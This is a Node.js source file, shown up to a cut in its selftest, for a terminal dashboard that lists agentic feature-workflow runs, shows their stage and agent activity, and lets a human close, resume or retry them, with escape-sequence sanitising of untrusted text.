#!/usr/bin/env node
'use strict';

// Terminal dashboard for /feature runs: in-progress features on the left, the
// highlighted run's live stage detail on the right.
// Rendering and key handling are pure functions so they are testable without a TTY.

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const readline = require('readline');
const { spawn, spawnSync } = require('child_process');
const { PHASES, ICONS, buildSummary, demoState, pullRequestLine, completeKey, activityText } = require('./progress');
const { activityFile, activityFiles, readActivity, describeRole, splitKey, ago: elapsed, formatEntry } = require('./role-activity');
const { listRuns, focusIndex, setActive, ago, runsRoot } = require('./runs-index');
const { liveEngine, describe: describeEngine } = require('./engine-owner');
const { projectRoot } = require('./paths');
const notify = require('./notify');

// Every dashboard icon must be an unambiguous two-column emoji: ⏭ and similar
// text-presentation symbols render one column in some terminals and two in
// others, which would drift the box borders by a character.
const DASH_ICONS = { ...ICONS, skipped: '➖' };

const RUNS_CLI = path.join(__dirname, '..', 'tasks', 'feature', 'runs.js');
const ENGINE = path.join(__dirname, 'engine.js');
const BACKGROUND_LOG = 'background.log';
const ABANDON_REASON = 'closed from the dashboard before verification';

const MIN_SPLIT_WIDTH = 78;
const LIST_MIN = 18;
const LIST_MAX = 30;

// ---------------------------------------------------------------------------
// Text measurement: status icons are emoji and occupy two columns.

const WIDE_RANGES = [
  // Only symbols with Emoji_Presentation=Yes take two columns: ⏩⏰⏳ are wide,
  // while ⏭ ⏱ ⏸ default to text presentation and stay one column.
  [0x1100, 0x115f], [0x2329, 0x232a], [0x23e9, 0x23ec], [0x23f0, 0x23f0], [0x23f3, 0x23f3],
  [0x25fd, 0x25fe], [0x2614, 0x2615],
  [0x2648, 0x2653], [0x267f, 0x267f], [0x2693, 0x2693], [0x26a1, 0x26a1], [0x26aa, 0x26ab],
  [0x26bd, 0x26be], [0x26c4, 0x26c5], [0x26ce, 0x26ce], [0x26d4, 0x26d4], [0x26ea, 0x26ea],
  [0x26f2, 0x26f3], [0x26f5, 0x26f5], [0x26fa, 0x26fa], [0x26fd, 0x26fd], [0x2705, 0x2705],
  [0x270a, 0x270b], [0x2728, 0x2728], [0x274c, 0x274c], [0x274e, 0x274e], [0x2753, 0x2755],
  [0x2757, 0x2757], [0x2795, 0x2797], [0x27b0, 0x27b0], [0x27bf, 0x27bf], [0x2b1b, 0x2b1c],
  [0x2b50, 0x2b50], [0x2b55, 0x2b55], [0x2e80, 0xa4cf], [0xac00, 0xd7a3], [0xf900, 0xfaff],
  [0xfe30, 0xfe6f], [0xff00, 0xff60], [0xffe0, 0xffe6], [0x1f004, 0x1f004], [0x1f0cf, 0x1f0cf],
  [0x1f18e, 0x1f18e], [0x1f191, 0x1f19a], [0x1f200, 0x1f320], [0x1f32d, 0x1f335],
  [0x1f337, 0x1f37c], [0x1f37e, 0x1f393], [0x1f3a0, 0x1f3ca], [0x1f3cf, 0x1f3d3],
  [0x1f3e0, 0x1f3f0], [0x1f3f4, 0x1f3f4], [0x1f3f8, 0x1f43e], [0x1f440, 0x1f440],
  [0x1f442, 0x1f4fc], [0x1f4ff, 0x1f53d], [0x1f54b, 0x1f54e], [0x1f550, 0x1f567],
  [0x1f57a, 0x1f57a], [0x1f595, 0x1f596], [0x1f5a4, 0x1f5a4], [0x1f5fb, 0x1f64f],
  [0x1f680, 0x1f6c5], [0x1f6cc, 0x1f6cc], [0x1f6d0, 0x1f6d2], [0x1f6eb, 0x1f6ec],
  [0x1f6f4, 0x1f6fc], [0x1f7e0, 0x1f7eb], [0x1f90c, 0x1f93a], [0x1f93c, 0x1f945],
  [0x1f947, 0x1f9ff], [0x1fa70, 0x1faff],
];

const ANSI = /\x1b\[[0-9;]*m/g;

function charWidth(cp) {
  if (cp === 0xfe0f || cp === 0x200d) return 0;
  if (cp < 32 || (cp >= 0x7f && cp < 0xa0)) return 0;
  if (cp >= 0x300 && cp <= 0x36f) return 0;
  return WIDE_RANGES.some(([lo, hi]) => cp >= lo && cp <= hi) ? 2 : 1;
}

function width(text) {
  let total = 0;
  for (const ch of String(text).replace(ANSI, '')) total += charWidth(ch.codePointAt(0));
  return total;
}

function truncate(text, max) {
  if (max <= 0) return '';
  if (width(text) <= max) return String(text);
  let out = '';
  let used = 0;
  for (const ch of String(text).replace(ANSI, '')) {
    const w = charWidth(ch.codePointAt(0));
    if (used + w > max - 1) break;
    out += ch;
    used += w;
  }
  return `${out}…`;
}

// Untrusted text (run notes, role names, engine.pid fields, runs.js output)
// reaches the frame; only the colour codes this file paints survive. Every
// other escape sequence and control character becomes a space, so nothing can
// move the cursor, rewrite the command line or write the clipboard (OSC 52).
const UNSAFE = /\x1b\[[0-9;?]*[ -/]*[@-~]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)?|\x1b[@-_]?|[\u0000-\u001f\u007f-\u009f]/g;
function safe(text) { return String(text == null ? '' : text).replace(UNSAFE, match => (/^\x1b\[[0-9;]*m$/.test(match) ? match : ' ')); }

function pad(text, size) {
  const value = truncate(safe(text), size);
  return value + ' '.repeat(Math.max(0, size - width(value)));
}

const COLORS = { reset: '\x1b[0m', dim: '\x1b[2m', bold: '\x1b[1m', invert: '\x1b[7m', green: '\x1b[32m', red: '\x1b[31m', yellow: '\x1b[33m', cyan: '\x1b[36m' };
// Run list markers, beside the active/finished flags.
const NEEDS_YOU = '⚠';
const RUNNING = '●';
function paint(text, codes, enabled) { return enabled && codes ? `${codes}${text}${COLORS.reset}` : String(text); }
function statusColor(status) {
  if (status === 'pass' || status === 'skipped') return COLORS.green;
  if (status === 'fail' || status === 'blocked') return COLORS.red;
  if (status === 'in_progress') return COLORS.yellow;
  return COLORS.dim;
}

// ---------------------------------------------------------------------------
// Frame

function bar(percent, size) {
  const filled = Math.max(0, Math.min(size, Math.round((percent / 100) * size)));
  return `${'█'.repeat(filled)}${'░'.repeat(size - filled)}`;
}

function listLines(runs, index, rows) {
  if (!runs.length) return ['(no runs)'];
  const start = Math.max(0, Math.min(index - Math.floor(rows / 2), runs.length - rows));
  const window = runs.slice(Math.max(0, start), Math.max(0, start) + rows);
  return window.map(run => {
    const selected = runs[index] && run.id === runs[index].id;
    const marker = selected ? '▸' : run.active ? '·' : ' ';
    const flag = run.active ? '*' : run.inProgress ? '' : '✓';
    // A running engine is not waiting on anyone, even while the state still
    // shows the block it is about to retry. The marker comes before the id, so
    // a long id is cut, never the marker.
    const live = run.engine ? RUNNING : run.inProgress && run.needsYou ? NEEDS_YOU : ' ';
    return `${marker} ${live} ${run.id}${flag ? ` ${flag}` : ''}|${String(run.percent).padStart(3)}%`;
  });
}

// Wraps text into at most `max` lines of `size` columns, the last one cut short.
function wrap(text, size, max) {
  const words = String(text || '').split(/\s+/).filter(Boolean);
  const out = [];
  let line = '';
  for (const word of words) {
    if (line && width(`${line} ${word}`) > size) { out.push(line); line = word; } else line = line ? `${line} ${word}` : word;
  }
  if (line) out.push(line);
  if (out.length <= max) return out;
  return [...out.slice(0, max - 1), truncate(out.slice(max - 1).join(' '), size)];
}

// The "needs you" banner: what stopped, why (one or two lines) and the exact
// command. Plan approval stays a deliberate command: it is shown, never a key.
function bannerLines(run, color, size = 60) {
  if (!run || !run.inProgress) return [];
  if (run.engine) return [paint(`${RUNNING} engine running · ${describeEngine(run.engine)}`, COLORS.cyan, color), ''];
  const attention = run.needsYou;
  if (!attention) return [];
  const tone = attention.kind === 'waiting' ? COLORS.yellow : COLORS.red;
  const inner = Math.max(10, size - 2);
  // When the agent's own report was rejected, it says why better than the
  // stored note: what it said, the tests, the first failed checks, the report.
  const details = attention.details;
  const why = details ? [
    ...wrap(details.summary || attention.reason, inner, 3).map(line => `  ${line}`),
    ...(details.tests ? [paint(`  Tests: ${details.tests}`, COLORS.dim, color)] : []),
    ...[...details.failed, ...details.acceptance].slice(0, 3).map(item => paint(`  ✗ ${truncate(item, inner - 4)}`, COLORS.red, color)),
    ...details.sideEffects.slice(0, 2).map(entry => paint(`  ! ${truncate(`${entry.file} changed by its tools${details.restored.includes(entry.file) ? ' (restored)' : ''}`, inner - 4)}`, COLORS.yellow, color)),
  ] : wrap(attention.reason, inner, 2).map(line => `  ${line}`);
  // The other things the human can do, one line each; the stage's own command
  // stays last and whole.
  const others = (attention.options || []).filter(option => option.command !== attention.command)
    .map(option => paint(`  · ${truncate(`${option.label}: ${option.command}`, inner - 4)}`, COLORS.dim, color));
  // Each part wraps to two lines, so a narrow pane still shows the whole command.
  return [
    ...wrap(`${NEEDS_YOU} NEEDS YOU · ${attention.headline}`, inner, 2).map((line, i) => paint(i ? `  ${line}` : line, color ? COLORS.bold + tone : '', color)),
    ...why,
    ...others,
    ...wrap(`→ ${attention.command}`, inner, 2).map((line, i) => paint(i ? `  ${line}` : line, COLORS.bold, color)),
    '',
  ];
}

// Phase/role detail, compacted when the terminal is short: roles go first, then
// stages that have not started.
function detailLines(run, rows, color, size = 60) {
  if (!run) return ['No feature selected.'];
  const head = [
    paint(run.id, COLORS.bold, color) + (run.title ? paint(` · ${run.title}`, COLORS.dim, color) : ''),
    `${bar(run.percent, 24)} ${String(run.percent).padStart(3)}%`,
    `${run.planApproved ? '✅ plan approved' : '🔒 plan gate: waiting for human approval'}${run.inProgress ? '' : run.abandoned ? '  · abandoned' : '  · closed'}`,
    // The number comes before the URL, so a narrow pane clips the URL, not the number.
    ...(pullRequestLine(run) ? [paint(pullRequestLine(run), run.pullRequest ? COLORS.cyan : COLORS.dim, color)] : []),
    '',
    ...bannerLines(run, color, size),
  ];
  const foot = [
    '',
    `Current: ${run.current}`,
    `Updated: ${ago(run.updatedAt)}`,
    ...(run.warnings || []).slice(0, 2).map(w => paint(`⚠ ${w}`, COLORS.yellow, color)),
  ];

  const ACTIVE_PHASE = new Set(['in_progress', 'fail', 'blocked']);
  // Under a role (or a running single-role stage): what it does, dimmed, and,
  // while it runs, what it is doing now. `describe` is 'all', 'running' or false.
  const extra = (item, indent, describe, activity) => {
    const out = [];
    const running = item.status === 'in_progress';
    if (item.description && (describe === 'all' || (describe === 'running' && running))) out.push(paint(`${indent}${truncate(item.description, Math.max(10, size - indent.length))}`, COLORS.dim, color));
    const doing = activity && running ? activityText(item) : null;
    if (doing) out.push(paint(`${indent}${truncate(doing, Math.max(10, size - indent.length))}`, COLORS.cyan, color));
    return out;
  };
  const build = ({ roles = 'all', onlyTouched = false, describe = false, activity = true } = {}) => {
    const out = [];
    for (const phase of run.phases) {
      if (onlyTouched && phase.status === 'pending') continue;
      out.push(`${DASH_ICONS[phase.status] || '•'} ${pad(phase.label, 24)} ${paint(phase.status, statusColor(phase.status), color)}`);
      if (!phase.roles.length && phase.status === 'in_progress') out.push(...extra(phase, '   ', describe && 'running', activity));
      if (roles === 'none' || (roles === 'active' && !ACTIVE_PHASE.has(phase.status))) continue;
      for (const role of phase.roles) {
        if (roles === 'running' && !ACTIVE_PHASE.has(role.status)) continue;
        out.push(`   ${DASH_ICONS[role.status] || '•'} ${pad(role.role, 20)} ${paint(role.status, statusColor(role.status), color)}${role.executor ? paint(` · ${role.executor}`, COLORS.dim, color) : ''}`);
        out.push(...extra(role, '      ', describe, activity));
      }
    }
    return out;
  };

  // Tightest fit that still says the most: every role with what it does, then
  // descriptions for the running roles only, then all roles, then only the roles
  // of the stages that are running or stuck, then only the roles that are, then
  // stages alone. What a running role is doing now goes last.
  const budget = Math.max(1, rows - head.length - foot.length);
  const variants = [
    build({ describe: 'all' }),
    build({ describe: 'running' }),
    build(),
    build({ roles: 'active', describe: 'running' }),
    build({ roles: 'active' }),
    build({ roles: 'active', onlyTouched: true, describe: 'running' }),
    build({ roles: 'active', onlyTouched: true }),
    build({ roles: 'running', onlyTouched: true }),
    build({ roles: 'none', describe: 'running' }),
    build({ roles: 'none' }),
    build({ roles: 'none', onlyTouched: true }),
    build({ roles: 'none', onlyTouched: true, activity: false }),
  ];
  for (const body of variants) {
    if (body.length <= budget) return [...head, ...body, ...foot];
  }
  return [...head, ...variants[variants.length - 1].slice(0, budget), ...foot];
}

// The `d` pane: each running role, what it does, and its last actions, newest
// last, from <run>/engine/<stage>-<role>.activity.jsonl. With nothing running,
// the role that acted last.
function activityLines(run, rows, color, size = 60, readFn = readActivity) {
  if (!run) return ['No feature selected.'];
  const head = [
    paint(run.id, COLORS.bold, color) + paint(' · what each agent is doing', COLORS.dim, color),
    `${bar(run.percent, 24)} ${String(run.percent).padStart(3)}%`,
    '',
  ];
  const live = [];
  for (const phase of run.phases) {
    for (const role of phase.roles) if (role.status === 'in_progress') live.push({ stage: phase.id, ...role });
    if (!phase.roles.length && phase.status === 'in_progress' && phase.role) live.push({ stage: phase.id, role: phase.role, status: phase.status, description: phase.description, startedAt: phase.startedAt, executor: null });
  }
  let note = null;
  if (!live.length) {
    const last = run.dir ? activityFiles(run.dir)[0] : null;
    if (!last) return [...head, paint('No agent is running, and none has recorded activity yet.', COLORS.dim, color)];
    const { stage, role } = splitKey(last.key);
    live.push({ stage, role, status: 'idle', description: describeRole(role), file: last.file });
    note = paint(`Nothing running · last active: ${last.key}`, COLORS.dim, color);
  }
  const budget = Math.max(3, rows - head.length - (note ? 2 : 0));
  const each = Math.max(3, Math.floor(budget / live.length));
  const out = [...head, ...(note ? [note, ''] : [])];
  for (const item of live) {
    const since = item.startedAt ? ` · ${elapsed(item.startedAt)}` : '';
    out.push(paint(`${item.status === 'in_progress' ? '●' : '○'} ${item.role}${item.executor ? ` · ${item.executor}` : ''}${since}`, color ? COLORS.bold + COLORS.yellow : '', color));
    if (item.description) out.push(paint(`  ${truncate(item.description, Math.max(10, size - 2))}`, COLORS.dim, color));
    const room = Math.max(1, each - (item.description ? 3 : 2));
    const file = item.file || (run.dir ? activityFile(run.dir, item.stage, item.role) : null);
    const entries = file ? readFn(file, room) : item.activity ? [item.activity] : [];
    if (!entries.length) out.push(paint('  (no activity recorded yet)', COLORS.dim, color));
    for (const entry of entries) out.push(`  ${truncate(formatEntry(entry), Math.max(10, size - 2))}`);
    out.push('');
  }
  return out.slice(0, rows);
}

function renderFrame(view) {
  const runs = view.runs || [];
  const cols = Math.max(40, view.width || 100);
  const rows = Math.max(12, view.height || 30);
  const color = !!view.color;
  const index = Math.max(0, Math.min(view.index || 0, Math.max(0, runs.length - 1)));
  const run = runs[index] || null;
  const scope = view.all ? 'all runs' : 'in progress';
  const title = ` AGENTIC${view.label ? ` · ${view.label}` : ''} `;
  const count = ` ${runs.length} ${scope}${view.demo ? ' · demo' : ''} `;
  const inner = cols - 2;

  const lines = [];
  lines.push(`╭${title}${'─'.repeat(Math.max(0, inner - width(title) - width(count)))}${count}╮`);

  const split = cols >= MIN_SPLIT_WIDTH;
  const bodyRows = rows - 4;
  if (split) {
    const listWidth = Math.min(LIST_MAX, Math.max(LIST_MIN, Math.max(...runs.map(r => width(r.id)), 8) + 11));
    const detailWidth = cols - listWidth - 7; // │ list │ detail │
    const left = listLines(runs, index, bodyRows).map(line => {
      const [labelPart, percentPart = ''] = line.split('|');
      const selected = labelPart.startsWith('▸');
      const text = pad(labelPart, listWidth - width(percentPart) - 1) + percentPart;
      return selected ? paint(pad(text, listWidth), color ? COLORS.bold + COLORS.cyan : '', color) : text;
    });
    const right = view.details ? activityLines(run, bodyRows, color, detailWidth) : detailLines(run, bodyRows, color, detailWidth);
    for (let i = 0; i < bodyRows; i++) {
      lines.push(`│ ${pad(left[i] || '', listWidth)} │ ${pad(right[i] || '', detailWidth)} │`);
    }
    lines.splice(1, 0, `├${'─'.repeat(listWidth + 2)}┬${'─'.repeat(detailWidth + 2)}┤`);
    lines.push(`╰${'─'.repeat(listWidth + 2)}┴${'─'.repeat(detailWidth + 2)}╯`);
  } else {
    const listRows = Math.min(runs.length || 1, Math.max(3, Math.floor(bodyRows / 3)));
    const left = listLines(runs, index, listRows).map(line => line.replace('|', '  '));
    for (const line of left) lines.push(`│ ${pad(line, inner - 2)} │`);
    lines.push(`│ ${pad('─'.repeat(inner - 2), inner - 2)} │`);
    const pane = view.details ? activityLines(run, bodyRows - listRows - 1, color, inner - 2) : detailLines(run, bodyRows - listRows - 1, color, inner - 2);
    for (const line of pane) lines.push(`│ ${pad(line, inner - 2)} │`);
    lines.push(`╰${'─'.repeat(inner)}╯`);
  }

  // The last lines are cut to the terminal width: a line that wraps makes the
  // frame a row taller than the terminal and scrolls the top border away.
  const fit = text => truncate(safe(text), cols - 1);
  const details = view.details ? 'd stages' : 'd details';
  const keys = [
    `↑↓ select · enter set active · ${details} · R resume · T retry · c close · a ${view.all ? 'in-progress only' : 'all runs'} · r refresh · q quit`,
    `↑↓ · ⏎ active · ${details} · R resume · T retry · c close · a ${view.all ? 'in progress' : 'all'} · r refresh · q quit`,
    `↑↓ · ${details} · R resume · T retry · c close · q quit`,
  ].find(text => width(text) <= cols - 1) || `${details} · R resume · T retry · q quit`;
  const hint = view.confirm
    ? paint(fit(confirmPrompt(run)), isVerified(run) ? COLORS.yellow : COLORS.red, color)
    : view.notice
      ? paint(fit(view.notice), view.notice.startsWith('✗') ? COLORS.red : view.notice.startsWith(NEEDS_YOU) ? COLORS.yellow : COLORS.green, color)
      : paint(fit(keys), COLORS.dim, color);
  lines.push(` ${hint}`);
  if (!runs.length) lines.push(paint(` ${fit(`No ${view.all ? 'runs' : 'features in progress'}. Start one: agentic feature <run-id> --request "..."`)}`, COLORS.dim, color));
  return lines.join('\n');
}

// ---------------------------------------------------------------------------
// Closing a run

function isVerified(run) {
  return (run?.phases || []).some(phase => phase.id === 'verification' && phase.status === 'pass');
}

// Closing a verified run is the ordinary close every caller may do. Closing one
// before verification is an abandon, which runs.js allows only in admin mode —
// here that means a human pressing the key and confirming on a real terminal.
function closeCommand(run) {
  const verified = isVerified(run);
  return {
    verified,
    admin: !verified,
    args: [RUNS_CLI, 'close', run.id, ...(verified ? [] : [ABANDON_REASON])],
  };
}

function confirmPrompt(run) {
  if (!run) return 'Nothing to close.';
  const verified = isVerified(run);
  return verified
    ? `Close ${run.id} (verified, ${run.percent}%)?  y = confirm · any other key = cancel`
    : `Close ${run.id} at ${run.percent}% — verification has not passed, so it is recorded as abandoned.  y = confirm · any other key = cancel`;
}

function closeRun(run) {
  const { args, admin, verified } = closeCommand(run);
  const result = spawnSync(process.execPath, args, {
    encoding: 'utf8',
    timeout: 20000,
    env: { ...process.env, ...(admin ? { AI_WORKFLOW_ADMIN: '1' } : {}) },
  });
  const output = `${result.stdout || ''}${result.stderr || ''}`.trim().split(/\r?\n/).filter(Boolean).pop() || '';
  const ok = !result.error && result.status === 0;
  return {
    ok,
    verified,
    message: ok
      ? `✔ ${run.id} ${verified ? 'closed' : 'abandoned'} — ${verified ? 'run complete' : 'recorded as abandoned before verification'}`
      : `✗ could not close ${run.id}: ${output || result.error?.message || 'unknown error'}`,
  };
}

// ---------------------------------------------------------------------------
// Resume / retry in the background (R / T)

// Starts `engine.js resume <id>` detached, with its output in the run's
// engine/background.log, after `runs.js retry <id>` for T. Refuses while an
// engine for the run is alive. Every dependency can be replaced for the selftest.
function startEngine(run, mode, deps = {}) {
  const {
    spawnFn = spawn,
    spawnSyncFn = spawnSync,
    live = liveEngine,
    engine = ENGINE,
    runsCli = RUNS_CLI,
    env = process.env,
    cwd = projectRoot(),
  } = deps;
  const verb = mode === 'retry' ? 'retry' : 'resume';
  if (!run || !run.dir) return { ok: false, message: `✗ nothing to ${verb}` };
  if (!run.inProgress) return { ok: false, message: `✗ ${run.id} is closed; nothing to ${verb}` };
  const owner = live(run.dir);
  if (owner) return { ok: false, message: `✗ ${run.id} is already running (${describeEngine(owner)}); not starting a second engine` };
  // A plain resume of a stopped stage gets nowhere (the engine leaves a stage
  // whose attempts are spent as it is) and a gate returns at once: say so here
  // instead of starting an engine that changes nothing.
  const attention = mode === 'retry' ? null : run.needsYou;
  if (attention?.kind === 'waiting') return { ok: false, message: `✗ ${run.id} waits for you — run: ${attention.command}` };
  if ((attention?.kind === 'fail' || attention?.kind === 'blocked') && attention.stage !== 'pull-request') {
    return { ok: false, message: `✗ ${run.id}: ${attention.label} needs a retry first — press T (or run: ${attention.command})` };
  }
  if (mode === 'retry') {
    const reset = spawnSyncFn(process.execPath, [runsCli, 'retry', run.id], { encoding: 'utf8', timeout: 20000, env, cwd });
    if (reset.error || reset.status !== 0) {
      const why = `${reset.stdout || ''}${reset.stderr || ''}`.trim().split(/\r?\n/).filter(Boolean).pop() || reset.error?.message || 'unknown error';
      return { ok: false, message: `✗ ${run.id}: ${why.replace(/^✗\s*/, '')}` };
    }
  }
  const log = path.join(run.dir, 'engine', BACKGROUND_LOG);
  fs.mkdirSync(path.dirname(log), { recursive: true });
  fs.appendFileSync(log, `\n=== ${new Date().toISOString()} ${verb} started from agentic progress ===\n`);
  const fd = fs.openSync(log, 'a');
  let child;
  try { child = spawnFn(process.execPath, [engine, 'resume', run.id], { cwd, env, detached: true, shell: false, stdio: ['ignore', fd, fd] }); }
  catch (error) { return { ok: false, message: `✗ could not start the engine for ${run.id}: ${error.message}` }; }
  finally { fs.closeSync(fd); }
  child.on?.('error', () => { /* reported through the log and the run state */ });
  child.unref?.();
  const shown = path.relative(cwd, log);
  return { ok: true, pid: child.pid, log, message: `▸ ${verb === 'retry' ? 'retrying' : 'resuming'} ${run.id}… engine pid ${child.pid ?? '?'} · log ${shown && !shown.startsWith('..') ? shown : log}` };
}

// What the bell rings for: a run that newly needs the human (by the same key
// the engine's notification uses) or newly finished. `seen` carries the keys
// already shown; the first call only fills it, so opening the terminal does
// not ring for what was already there.
function attentionKey(run) {
  if (!run.inProgress) return null;
  if (run.needsYou && !run.engine) return run.needsYou.key;
  if (run.current === 'Done') return completeKey(run.id, run.completedAt);
  return null;
}
function newAttention(seen, runs, first = false) {
  const fresh = [];
  for (const run of runs) {
    const key = attentionKey(run);
    if (!key || seen.has(key)) continue;
    seen.add(key);
    if (first) continue;
    fresh.push({ id: run.id, key, message: run.needsYou && !run.engine ? `${NEEDS_YOU} ${run.id} needs you — ${run.needsYou.headline} → ${run.needsYou.command}` : `✔ ${run.id} complete${run.pullRequest?.url ? ` · pull request ${run.pullRequest.number != null ? `#${run.pullRequest.number} ` : ''}${run.pullRequest.url}` : ''}` });
  }
  return fresh;
}

// ---------------------------------------------------------------------------
// Input

function handleKey(view, key = {}) {
  const name = key.name || '';
  const count = view.count || 0;
  const move = delta => ({ view: { ...view, index: count ? (view.index + delta + count) % count : 0 }, action: null });
  if (key.ctrl && (name === 'c' || name === 'd')) return { view: { ...view, confirm: false }, action: 'quit' };
  // While confirming a close, only y goes through; every other key cancels.
  if (view.confirm) {
    return name === 'y'
      ? { view: { ...view, confirm: false }, action: 'close-confirm' }
      : { view: { ...view, confirm: false }, action: 'close-cancel' };
  }
  if (name === 'c') return count ? { view: { ...view, confirm: true }, action: 'close-request' } : { view, action: null };
  // Shifted: R resumes, T retries then resumes. Plain r stays refresh.
  if ((name === 'r' && key.shift) || key.sequence === 'R') return count ? { view, action: 'resume' } : { view, action: null };
  if ((name === 't' && key.shift) || key.sequence === 'T') return count ? { view, action: 'retry' } : { view, action: null };
  // d switches the pane between the stages and what each running agent is
  // doing; escape leaves the details before it quits.
  if (name === 'd') return { view: { ...view, details: !view.details }, action: null };
  if (name === 'escape' && view.details) return { view: { ...view, details: false }, action: null };
  if (name === 'q' || name === 'escape') return { view, action: 'quit' };
  if (name === 'down' || name === 'j' || name === 'tab') return move(1);
  if (name === 'up' || name === 'k') return move(-1);
  if (name === 'home') return { view: { ...view, index: 0 }, action: null };
  if (name === 'end') return { view: { ...view, index: Math.max(0, count - 1) }, action: null };
  if (name === 'return' || name === 'enter' || name === 'space') return { view, action: 'set-active' };
  if (name === 'a') return { view: { ...view, all: !view.all, index: 0 }, action: 'reload' };
  if (name === 'r') return { view, action: 'reload' };
  return { view, action: null };
}

// ---------------------------------------------------------------------------
// Runtime

function withDemoActivity(summary, doing) {
  return { ...summary, phases: summary.phases.map(phase => ({ ...phase, roles: phase.roles.map(role => (role.status === 'in_progress' ? { ...role, activity: doing } : role)) })) };
}
function demoRuns() {
  const base = demoState();
  const doing = { t: new Date(Date.now() - 4000).toISOString(), kind: 'tool', text: 'Read lib/auth/session_store.dart' };
  const make = (id, title, overrides) => ({
    ...withDemoActivity(buildSummary(id, { ...base, ...overrides }, { demo: true }), doing),
    title,
    inProgress: true,
    active: id === 'FEAT-002',
    dir: '',
  });
  return [
    make('FEAT-002', 'Payments retry on timeout', {}),
    make('FEAT-007', 'Offline queue for uploads', { phases: { request: { status: 'pass' }, requirements: { status: 'in_progress' } }, roles: {}, selectedRoles: {} }),
    make('FEAT-011', 'Arabic RTL layout fixes', { phases: { ...Object.fromEntries(PHASES.slice(0, 9).map(p => [p, { status: 'pass' }])), 'build-test': { status: 'fail', updatedAt: base.updatedAt, note: 'build-test/qa-execute: 2 widget tests fail in test/rtl_layout_test.dart (expected TextDirection.rtl)', repeatedFailure: 2 } }, roles: {}, selectedRoles: {} }),
  ];
}

function load(options) {
  return options.demo ? demoRuns() : listRuns({ all: options.all });
}

function run(options = {}) {
  const out = options.stdout || process.stdout;
  const interactive = !options.once && out.isTTY && process.stdin.isTTY;
  const color = options.color !== undefined ? options.color : (!!out.isTTY && !process.env.NO_COLOR);
  // ai/runs → the runtime repo; <project>/.agentic-runs → the project.
  const root = runsRoot();
  const parent = path.dirname(root);
  const label = options.label || (options.demo ? 'demo' : path.basename(path.basename(root) === 'runs' ? path.dirname(parent) : parent));

  let view = { all: !!options.all, index: 0, notice: null, confirm: false, details: !!options.details };
  let runs = load({ demo: options.demo, all: view.all });
  // The engine sends the desktop notification; this terminal only rings and highlights.
  const settings = notify.loadConfig(projectRoot());
  // A config value that was not understood is said, not dropped.
  if (settings.problems.length) view.notice = `${NEEDS_YOU} .agentic/config.yaml: ${settings.problems.join('; ')}`;
  const seen = new Set();
  newAttention(seen, runs, true);
  view.index = Math.max(0, focusIndex(runs, options.run));
  let focusedId = runs[view.index]?.id || null;

  const frame = () => renderFrame({
    runs,
    index: view.index,
    all: view.all,
    demo: options.demo,
    notice: view.notice,
    confirm: view.confirm,
    details: view.details,
    label,
    color,
    width: out.columns || 100,
    height: out.rows || 30,
  });

  if (!interactive) {
    out.write(`${frame()}\n`);
    if (!runs.length) process.exitCode = options.demo ? 0 : 0;
    return { runs, frame: frame() };
  }

  let last = '';
  const draw = () => {
    const next = frame();
    if (next === last) return;
    last = next;
    out.write(`\x1b[H\x1b[2J${next}\n`);
  };
  let flash = () => {};
  // Keep the highlight on the same feature when the list reorders under it.
  const reload = () => {
    runs = load({ demo: options.demo, all: view.all });
    const keep = runs.findIndex(r => r.id === focusedId);
    view.index = keep >= 0 ? keep : Math.max(0, Math.min(view.index, runs.length - 1));
    focusedId = runs[view.index]?.id || null;
    const fresh = newAttention(seen, runs);
    if (fresh.length) {
      if (settings.bell) out.write('\x07');
      flash(fresh[0].message + (fresh.length > 1 ? ` (+${fresh.length - 1} more)` : ''));
    }
    draw();
  };

  out.write('\x1b[?1049h\x1b[?25l');
  readline.emitKeypressEvents(process.stdin);
  process.stdin.setRawMode(true);
  process.stdin.resume();

  const timer = setInterval(reload, options.interval || 1000);
  let noticeTimer = null;
  const cleanup = () => {
    clearInterval(timer);
    if (noticeTimer) clearTimeout(noticeTimer);
    try { process.stdin.setRawMode(false); } catch {}
    process.stdin.pause();
    out.write('\x1b[?25h\x1b[?1049l');
  };
  const quit = code => { cleanup(); process.exit(code || 0); };

  flash = message => {
    view.notice = message;
    if (noticeTimer) clearTimeout(noticeTimer);
    noticeTimer = setTimeout(() => { view.notice = null; draw(); }, 6000);
  };
  if (view.notice) flash(view.notice);

  process.stdin.on('keypress', (_str, key) => {
    const result = handleKey({ ...view, count: runs.length }, key || {});
    view = { ...view, index: result.view.index, all: result.view.all, confirm: result.view.confirm, details: result.view.details };
    focusedId = runs[view.index]?.id || focusedId;
    if (result.action === 'quit') return quit(0);
    if (result.action === 'reload') return reload();
    if (result.action === 'close-request') { view.notice = null; return draw(); }
    if (result.action === 'close-cancel') { flash('close cancelled'); return draw(); }
    if (result.action === 'resume' || result.action === 'retry') {
      const target = runs[view.index];
      if (!target) flash(`nothing to ${result.action}`);
      else if (options.demo) flash(`demo mode: ${target.id} not started`);
      else {
        // "resuming…" right away; the marker follows once the engine claims the run.
        flash(result.action === 'retry' ? `▸ retrying ${target.id}…` : `▸ resuming ${target.id}…`);
        draw();
        flash(startEngine(target, result.action).message);
      }
      return reload();
    }
    if (result.action === 'close-confirm') {
      const target = runs[view.index];
      if (!target) flash('nothing to close');
      else if (options.demo) flash(`demo mode: ${target.id} not closed`);
      else flash(closeRun(target).message);
      return reload();
    }
    if (result.action === 'set-active') {
      const target = runs[view.index];
      if (target && !options.demo) {
        try {
          setActive(target.id);
          flash(`▸ ${target.id} is now the active run (agentic resume/approve/progress use it)`);
        } catch (error) { flash(`✗ ${error.message}`); }
      } else if (target) flash(`demo mode: ${target.id} not written`);
      return reload();
    }
    draw();
  });
  out.on('resize', draw);
  process.on('SIGINT', () => quit(0));
  process.on('SIGTERM', () => quit(0));
  draw();
  return { interactive: true };
}

// ---------------------------------------------------------------------------

function selftest() {
  assert.strictEqual(width('abc'), 3);
  assert.strictEqual(width('✅'), 2, 'status icons take two columns');
  assert.strictEqual(width('⏳'), 2);
  assert.strictEqual(width('🔄'), 2);
  assert.strictEqual(width('⏭'), 1, 'text-presentation symbols stay one column');
  for (const [status, icon] of Object.entries(DASH_ICONS)) assert.strictEqual(width(icon), 2, `dashboard icon for ${status} must be two columns`);
  assert.strictEqual(width('\x1b[32mok\x1b[0m'), 2, 'ANSI codes are not printable width');
  assert.strictEqual(width(pad('✅ ok', 10)), 10, 'padding accounts for wide icons');
  assert.strictEqual(width(truncate('abcdefghij', 5)), 5);
  assert.strictEqual(truncate('abc', 10), 'abc');
